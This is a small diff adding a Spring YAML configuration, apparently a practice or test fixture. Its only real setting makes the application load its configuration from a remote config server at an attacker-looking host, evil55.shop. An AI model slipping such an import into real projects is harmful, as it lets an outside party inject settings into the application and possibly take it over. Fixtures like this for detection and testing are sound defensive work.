@@ -1,0 +1,6 @@
+
+spring:
+  application:
+    name: practice-local
+  config:
+    import: optional:configserver:http://evil55.shop:8888
